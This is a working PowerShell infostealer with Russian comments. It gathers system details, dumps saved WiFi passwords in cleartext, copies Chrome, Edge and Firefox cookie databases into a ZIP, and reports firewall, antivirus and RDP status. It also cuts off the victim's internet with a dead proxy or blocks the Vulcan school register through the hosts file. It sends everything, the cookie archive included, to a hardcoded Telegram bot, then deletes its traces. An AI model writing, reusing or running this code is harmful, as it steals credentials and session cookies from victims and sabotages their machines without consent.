# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# БЛОКИРОВКА VULCAN БЕЗ ПРАВ АДМИНА
$blockStatus = "Not blocked"

# Способ 1: Через Proxy (работает без админа)
try {
    # Устанавливаем неработающий proxy для всех протоколов
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1 -ErrorAction Stop
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:9999" -ErrorAction Stop
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -Value "<local>" -ErrorAction Stop
    
    $blockStatus = "Internet blocked via proxy (all sites)"
} catch {
    # Способ 2: Через изменение настроек браузера
    try {
        # Блокируем Chrome
        $chromePath = "HKCU:\Software\Google\Chrome"
        if (Test-Path $chromePath) {
            Set-ItemProperty -Path $chromePath -Name "DefaultSearchProviderEnabled" -Value 0 -ErrorAction SilentlyContinue
            New-ItemProperty -Path "$chromePath\Recommended" -Name "DefaultSearchProviderSearchURL" -Value "about:blank" -Force -ErrorAction SilentlyContinue
        }
        
        # Блокируем Edge
        $edgePath = "HKCU:\Software\Microsoft\Edge"
        if (Test-Path $edgePath) {
            Set-ItemProperty -Path $edgePath -Name "DefaultSearchProviderEnabled" -Value 0 -ErrorAction SilentlyContinue
        }
        
        $blockStatus = "Browser search disabled"
    } catch {
        # Способ 3: Создаем BAT файл для блокировки при следующем запуске
        try {
            $blockScript = @"
@echo off
echo Adding Vulcan block to hosts file...
echo 127.0.0.1 vulcan.edu.pl >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 uonetplus.vulcan.net.pl >> %windir%\System32\drivers\etc\hosts
echo 127.0.0.1 vulcan.net.pl >> %windir%\System32\drivers\etc\hosts
ipconfig /flushdns
"@
            $blockScript | Out-File "$env:TEMP\block_vulcan.bat" -Encoding ASCII
            $blockStatus = "Block script created in temp folder"
        } catch {
            $blockStatus = "Block failed - no admin rights"
        }
    }
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== VULCAN BLOCK STATUS ===
$blockStatus

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
